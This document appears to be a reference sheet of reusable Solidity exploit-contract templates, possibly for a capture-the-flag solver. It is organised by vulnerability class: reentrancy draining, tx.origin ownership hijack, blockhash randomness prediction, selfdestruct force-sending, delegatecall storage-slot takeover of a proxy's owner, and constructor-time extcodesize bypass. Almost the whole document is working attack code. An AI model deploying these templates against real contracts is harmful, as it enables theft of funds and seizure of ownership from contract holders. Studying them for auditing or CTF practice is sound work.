# Payload families — the exploit-contract templates by class

## The Solver skeleton

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Solver {
    address me;
    constructor() { me = msg.sender; }
    // the class-specific function + the hooks it needs
}
```

The `me` = the supplied caller (the deployer) — the attributable EOA. Every
contract template records `me` so the solve traces to the caller.

## The reentrancy family

```solidity
contract Reenter {
    IVuln v;
    constructor(address _v) { v = IVuln(_v); }
    function attack() external payable {
        v.deposit{value: msg.value}();
        v.withdraw(msg.value);
    }
    receive() external payable {
        if (address(v).balance >= 1 ether) v.withdraw(1 ether);   // bound by the balance
    }
}
```

## The phish family (tx.origin)

```solidity
contract Phish {
    function attack(address t) external { ITarget(t).changeOwner(); }
    // inside Target: tx.origin = caller EOA, msg.sender = this contract
}
```

## The predict family (weak-randomness)

```solidity
contract Predict {
    function attack(address t) external {
        uint a = uint(keccak256(abi.encode(blockhash(block.number-1), block.timestamp)));
        ITarget(t).guess(a);   // same block → same values → the answer
    }
}
```

## The force family (selfdestruct)

```solidity
contract Force {
    constructor() payable {}                          // funded on deploy
    function boom(address t) external { selfdestruct(payable(t)); }
}
```

## The collision family (delegatecall)

```solidity
contract Evil {
    address public a;                                  // slot0 aligns with proxy's impl
    address public owner;                              // slot1 aligns with proxy's owner
    function pwn() external { owner = tx.origin; }
}
// call proxy.fallback with pwn()'s selector → delegatecall writes proxy's owner
```

## The sequencer family (front-running / atomic)

```solidity
contract Sequencer {
    ITarget t;
    constructor(address _t) { t = ITarget(_t); }
    function run() external {
        t.step1(); t.step2(); t.step3();   // atomic, guaranteed order
    }
}
```

## The constructor-EOA family

```solidity
contract Tricky {
    constructor(address t) { ITarget(t).go(); }   // extcodesize == 0 during construction
}
```

## The interface shorthand

```solidity
interface ITarget { function go() external; }
interface IVuln { function deposit() external payable; function withdraw(uint) external; }
```

Declare only the functions the exploit calls — the interface needs no other
members.
